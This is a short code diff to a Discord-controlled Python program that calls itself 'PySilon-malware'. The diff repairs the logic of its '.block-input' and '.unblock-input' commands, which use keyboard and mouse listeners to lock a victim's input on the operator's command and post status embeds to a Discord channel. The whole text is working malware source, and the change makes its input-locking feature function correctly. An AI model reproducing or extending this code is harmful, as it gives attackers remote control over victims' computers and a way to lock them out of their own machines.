@@ -3,7 +3,7 @@ from pynput import keyboard, mouse
 
 # on message
 elif message.content == '.block-input':
-    if input_blocked:
+    if not input_blocked:
         await message.delete()
     
         async def on_press():
@@ -23,19 +23,21 @@ elif message.content == '.block-input':
         embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
+        input_blocked = True
     else:
         embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
 
 elif message.content == '.unblock-input':
-    if not input_blocked:
+    if input_blocked:
         await message.delete()
         keyboard_listener.stop()
         mouse_listener.stop()
         embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
+        input_blocked = False
     else:
         embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .block-input```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
